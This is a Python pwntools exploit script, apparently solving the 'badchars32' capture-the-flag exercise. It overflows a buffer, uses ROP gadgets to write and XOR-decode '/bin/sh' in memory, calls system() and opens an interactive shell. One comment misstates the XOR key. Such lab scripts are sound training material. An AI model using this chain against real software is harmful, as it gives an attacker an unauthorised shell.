#!/usr/bin/python

import os
from pwn import *

e = ELF('./badchars32')           		# binary
r = process(e.path)


s_data = 0x0804a038						# write string in .data
bin = 0x38757e79						# /bin xor 0x17
sh = 0x38647f17							# /sh xor 0x17
key = 0x17171717                        # xor key = 0x1
gg1 = 0x08048899                        # pop esi ; pop edi ; ret
gg2 = 0x08048893                        # mov dword ptr [edi], esi ; ret
gg3 = 0x08048897                        # pop ecx ; ret
gg4 = 0x08048890                        # xor byte ptr [ebx], cl ; ret
gg5 = 0x08048461                        # pop ebx ; ret

payload = 'A' * 44						# offset to vuln buffer
payload += p32(gg1)
payload += p32(bin, endian='big')		# pop esi [/bin]
payload += p32(s_data) 					# pop edi [.data]
payload += p32(gg2)						# copy esi into [edi]

payload += p32(gg1)
payload += p32(sh, endian='big')		# pop esi [/sh]
payload += p32(s_data+4) 				# pop edi [.data+4]
payload += p32(gg2)						# copy esi into [edi]

payload += p32(gg3)
payload += p32(key)                     # pop ecx [xor key]

for i in range (0, 8):
    payload += p32(gg5)
    payload += p32(s_data+i)            # pop ebx [.data+i]
    payload += p32(gg4)

payload += p32(e.symbols['system'])
payload += 'AAAA'						# should be exit()
payload += p32(s_data)


r.recvuntil('>')
r.sendline(payload)						# send payload
r.interactive()
